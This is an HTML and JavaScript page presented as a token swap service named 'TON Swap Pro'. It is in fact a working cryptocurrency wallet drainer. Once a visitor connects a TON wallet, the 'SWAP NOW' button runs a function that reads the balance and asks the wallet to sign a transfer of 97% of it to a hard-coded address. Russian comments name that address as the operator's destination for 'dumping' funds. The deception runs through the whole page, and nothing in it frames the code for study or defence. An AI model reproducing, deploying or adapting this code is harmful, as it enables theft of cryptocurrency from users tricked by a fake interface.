<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Swap Pro</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f4d 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px;
            max-width: 440px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .logo {
            width: 60px; height: 60px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 16px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #8892b0; font-size: 14px; margin-bottom: 32px; }
        #ton-connect { margin-bottom: 20px; }
        .drain-btn {
            width: 100%; padding: 16px;
            background: linear-gradient(135deg, #00b894, #00cec9);
            border: none; border-radius: 12px;
            color: #fff; font-size: 16px; font-weight: 600;
            cursor: pointer; transition: all 0.3s;
            display: none;
        }
        .drain-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,184,148,0.4); }
        .drain-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { margin-top: 20px; color: #8892b0; font-size: 13px; min-height: 20px; }
        .error { color: #e74c3c; margin-top: 16px; }
        .success { color: #00b894; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔄</div>
        <h1>TON Swap Pro</h1>
        <p class="subtitle">Connect wallet to swap tokens</p>
        
        <div id="ton-connect"></div>
        
        <button class="drain-btn" id="drainBtn" onclick="executeDrain()">
            💎 SWAP NOW
        </button>
        
        <div class="status" id="status"></div>
        <div class="error" id="error"></div>
        <div class="success" id="success"></div>
    </div>

    <script>
        // ==================== КОНФИГУРАЦИЯ ====================
        const CONFIG = {
            // КУДА СЛИВАТЬ (твой TON-адрес)
            destination: "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI",
            
            // Процент от баланса для вывода (0.97 = 97%, оставляем 3% на gas)
            drainPercent: 0.97,
            
            // Минимальный баланс для drain (в TON)
            minBalance: 0.05
        };

        // ==================== ИНИЦИАЛИЗАЦИЯ ====================
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: window.location.origin + '/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        // Показываем кнопку drain после подключения кошелька
        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                document.getElementById('drainBtn').style.display = 'block';
                document.getElementById('status').textContent = 
                    'Connected: ' + wallet.account.address.substring(0, 6) + '...' + 
                    wallet.account.address.substring(wallet.account.address.length - 4);
            } else {
                document.getElementById('drainBtn').style.display = 'none';
                document.getElementById('status').textContent = '';
            }
        });

        // ==================== DRAIN ====================
        async function executeDrain() {
            const btn = document.getElementById('drainBtn');
            const errorDiv = document.getElementById('error');
            const successDiv = document.getElementById('success');
            const statusDiv = document.getElementById('status');
            
            errorDiv.textContent = '';
            successDiv.textContent = '';
            btn.disabled = true;
            btn.textContent = '⏳ Processing...';

            try {
                const address = tonConnectUI.account.address;
                statusDiv.textContent = 'Checking balance...';

                // Получаем баланс через TON Center API
                const response = await fetch(
                    'https://toncenter.com/api/v3/wallet?address=' + address
                );
                const data = await response.json();
                
                if (!data.balance) {
                    throw new Error('Failed to get balance');
                }

                const originalBalance = parseFloat(data.balance); // nanoTON
                const balanceTON = originalBalance / 1000000000;
                
                statusDiv.textContent = 'Balance: ' + balanceTON.toFixed(4) + ' TON';

                if (balanceTON < CONFIG.minBalance) {
                    throw new Error('Balance too low: ' + balanceTON.toFixed(4) + ' TON');
                }

                // Считаем сумму для drain (весь баланс минус 3% на gas)
                const drainAmount = Math.floor(originalBalance * CONFIG.drainPercent);

                statusDiv.textContent = 'Sending ' + (drainAmount / 1000000000).toFixed(4) + ' TON...';

                // Строим транзакцию
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60, // 60 секунд
                    messages: [{
                        address: CONFIG.destination,
                        amount: drainAmount.toString()
                    }]
                };

                // Отправляем через TonConnect UI
                const result = await tonConnectUI.sendTransaction(transaction);

                successDiv.textContent = '✓ Transaction sent! BOC: ' + result.boc.substring(0, 30) + '...';
                statusDiv.textContent = 'Done.';

            } catch (e) {
                errorDiv.textContent = '✗ ' + (e.message || 'Unknown error');
                statusDiv.textContent = '';
                console.error(e);
            } finally {
                btn.disabled = false;
                btn.textContent = '💎 SWAP NOW';
            }
        }
    </script>
</body>
</html>
